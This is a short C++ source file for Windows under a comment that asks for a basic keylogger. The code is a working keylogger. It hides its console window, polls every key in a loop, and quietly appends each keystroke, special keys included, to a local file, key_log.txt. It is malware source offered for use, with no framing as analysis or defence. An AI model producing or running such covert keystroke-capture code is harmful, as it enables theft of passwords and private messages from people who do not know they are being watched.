// Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file.
#include <iostream>
#include <fstream>
#include <windows.h>
using namespace std;

const char* logFile = "key_log.txt";

void logKeystroke(char key) {
    ofstream log;
    log.open(logFile, ios::app);
    if (log.is_open()) {
        log << key;
        log.close();
    }
}

void logSpecialKey(int vkCode) {
    ofstream log;
    log.open(logFile, ios::app);
    if (log.is_open()) {
        switch (vkCode) {
            case VK_SPACE: log << " [SPACE] "; break;
            case VK_RETURN: log << " [ENTER] "; break;
            case VK_TAB: log << " [TAB] "; break;
            case VK_SHIFT: log << " [SHIFT] "; break;
            case VK_BACK: log << " [BACKSPACE] "; break;
            case VK_ESCAPE: log << " [ESC] "; break;
            default: log << " [" << vkCode << "] "; break;
        }
        log.close();
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    while (true) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
                if ((key >= 65 && key <= 90) || (key >= 97 && key <= 122)) {
                    bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
                    char c = isShiftPressed ? key : tolower(key);
                    logKeystroke(c);
                }
                else if (key >= 48 && key <= 57) {
                    logKeystroke(key);
                }
                else {
                    logSpecialKey(key);
                }
            }
        }
        Sleep(10);
    }
    return 0;
}
